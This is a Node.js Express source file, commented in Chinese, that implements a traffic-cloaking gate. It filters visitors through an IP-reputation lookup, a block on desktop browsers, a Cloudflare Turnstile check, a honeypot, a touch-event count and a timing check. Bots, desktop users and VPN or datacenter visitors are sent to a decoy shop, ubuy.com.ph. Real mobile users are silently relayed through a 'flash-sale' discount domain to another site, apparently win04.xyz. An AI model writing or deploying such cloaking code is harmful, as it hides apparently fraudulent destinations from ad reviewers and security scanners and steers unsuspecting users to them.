import express from 'express';
import cors from 'cors';
import crypto from 'crypto';

const app = express();
const PORT = process.env.PORT || 3001;

// ============================================
// 环境变量（从 Zeabur 或 .env 注入）
// ============================================
const IPAPI_IS_KEY = process.env.IPAPI_IS_KEY || '';
const HMAC_SECRET = process.env.HMAC_SECRET || 'change-me-in-production';
const TURNSTILE_SECRET = process.env.TURNSTILE_SECRET || '';
const REAL_REDIRECT = process.env.REAL_REDIRECT || 'https://www.win04.xyz/?type=0&cid=402&a=x';
const FAKE_REDIRECT = process.env.FAKE_REDIRECT || 'https://www.ubuy.com.ph/';
const FLASH_SALE_URL = process.env.FLASH_SALE_URL || 'https://mings.hugediscount.store/flash-sale';

// ============================================
// 工具函数
// ============================================

// 生成带签名的 token: ts.ip_sig.hex_sig
// ip_sig = HMAC(ip, secret) 前16字节hex = 32字符
// hex_sig = HMAC(ts+ip, secret) 完整hex = 64字符
function generateToken(ip) {
  const ts = Date.now();
  const ipSig = crypto.createHmac('sha256', HMAC_SECRET).update(ip).digest('hex').substring(0, 32);
  const sigData = `${ts}.${ip}`;
  const hexSig = crypto.createHmac('sha256', HMAC_SECRET).update(sigData).digest('hex');
  return `${ts}.${ipSig}.${hexSig}`;
}

// 生成假token（用于bot，给假token让flash-sale识别）
function generateFakeToken() {
  return `fake_${crypto.randomBytes(32).toString('hex')}`;
}

// ============================================
// IP 类型检测
// ============================================
async function checkIPType(ip) {
  if (!IPAPI_IS_KEY) {
    return 'passed';
  }
  try {
    const url = `https://api.ipapi.is?q=${encodeURIComponent(ip)}&key=${IPAPI_IS_KEY}`;
    const resp = await fetch(url);
    if (!resp.ok) {
      console.log(`[verify] ipapi.is HTTP ${resp.status}`);
      return 'passed';
    }
    const data = await resp.json();
    if (data.is_datacenter || data.is_vpn || data.is_proxy || data.is_tor || data.is_abuser) {
      return 'blocked';
    }
    return 'passed';
  } catch (e) {
    console.log('[verify] ipapi.is error:', e.message);
    return 'passed';
  }
}

// ============================================
// Cloudflare Turnstile 验证（强制，不跳过）
// ============================================
async function checkTurnstile(token, ip) {
  if (!token) return false;
  if (!TURNSTILE_SECRET) {
    console.log('[verify] Turnstile secret not configured, rejecting request');
    return false;
  }
  try {
    const resp = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `secret=${encodeURIComponent(TURNSTILE_SECRET)}&response=${encodeURIComponent(token)}&remoteip=${encodeURIComponent(ip)}`
    });
    const data = await resp.json();
    return data.success === true;
  } catch (e) {
    console.log('[verify] Turnstile error:', e.message);
    return false;
  }
}

// ============================================
// 中间件
// ============================================
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json());

function getClientIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
         req.headers['cf-connecting-ip'] ||
         req.socket?.remoteAddress?.replace('::ffff:', '') ||
         'unknown';
}

// ============================================
// 核心检验函数（复用）
// ============================================
async function runChecks(req) {
  const clientIP = getClientIP(req);
  const userAgent = req.headers['user-agent'] || '';
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  const {
    touchEventsCount = 0,
    answerTimeMs = 0,
    honeypotValue = '',
    turnstileToken = '',
    answer,
    correctAnswer
  } = req.body || {};

  // L1: IP type
  const ipResult = await checkIPType(clientIP);
  if (ipResult === 'blocked') {
    return { pass: false, reason: 'ip_blocked', token: generateFakeToken() };
  }

  // L2: 设备类型 — 桌面 = 直接失败，不继续
  if (!isMobile) {
    console.log(`[verify] desktop → fail immediately`);
    return { pass: false, reason: 'desktop', token: generateFakeToken() };
  }

  // L3: Turnstile
  const turnstileOk = await checkTurnstile(turnstileToken, clientIP);
  if (!turnstileOk) {
    return { pass: false, reason: 'turnstile', token: generateFakeToken() };
  }

  // L4: 蜜罐
  if (honeypotValue && honeypotValue.length > 0) {
    return { pass: false, reason: 'honeypot', token: generateFakeToken() };
  }

  // L5: 触摸事件
  if (touchEventsCount < 1) {
    return { pass: false, reason: 'no_interaction', token: generateFakeToken() };
  }

  // L6: 答题时间（阈值 2000ms）
  if (answerTimeMs <= 2000) {
    return { pass: false, reason: 'too_fast', token: generateFakeToken() };
  }

  return { pass: true, reason: 'all_passed', token: generateToken(clientIP) };
}

// ============================================
// POST /api/verify
// 返回 JSON { redirectUrl } — 前端直接 window.location.href 跳转
// ============================================
app.post('/api/verify', async (req, res) => {
  const result = await runChecks(req);

  if (!result.pass) {
    // 骇客/机器人 → 直接跳转假站
    console.log(`[verify] FAIL (${result.reason}) → ubuy.com.ph`);
    return res.json({ redirectUrl: FAKE_REDIRECT, pass: false, reason: result.reason });
  }

  // 真人 → HMAC token + flash-sale 验证 → 真站
  const clientIP = getClientIP(req);
  const flashSaleUrl = `${FLASH_SALE_URL}?token=${encodeURIComponent(result.token)}`;

  try {
    // 静默调用 flash-sale 服务端点，让它验证 HMAC 并返回最终 redirect
    // 注意：flash-sale 从 x-forwarded-for 取 IP，这里透传原始 IP
    const resp = await fetch(flashSaleUrl, {
      method: 'GET',
      headers: {
        'X-Forwarded-For': clientIP,
        'Accept': 'text/html'
      },
      redirect: 'manual' // 不自动跟随 302，由我们读取 Location header
    });

    if (resp.status === 302 || resp.status === 301) {
      const location = resp.headers.get('location');
      console.log(`[verify] PASS → real redirect: ${location}`);
      return res.json({ redirectUrl: location, pass: true, reason: 'verified' });
    }

    // 非重定向响应（异常情况），默认走真站
    console.log(`[verify] PASS but flash-sale returned status ${resp.status}`);
    return res.json({ redirectUrl: REAL_REDIRECT, pass: true, reason: 'verified' });

  } catch (e) {
    console.log(`[verify] flash-sale call failed: ${e.message} → fallback real redirect`);
    return res.json({ redirectUrl: REAL_REDIRECT, pass: true, reason: 'verified' });
  }
});

// ============================================
// 健康检查
// ============================================
app.get('/health', (req, res) => {
  res.json({ status: 'ok', time: new Date().toISOString() });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`[verify-api] Running on port ${PORT}`);
  console.log(`[verify-api] IPAPI_IS_KEY: ${IPAPI_IS_KEY ? IPAPI_IS_KEY.substring(0, 8) + '...' : 'NOT SET'}`);
  console.log(`[verify-api] HMAC_SECRET: ${HMAC_SECRET.substring(0, 8)}...`);
  console.log(`[verify-api] FLASH_SALE_URL: ${FLASH_SALE_URL}`);
});
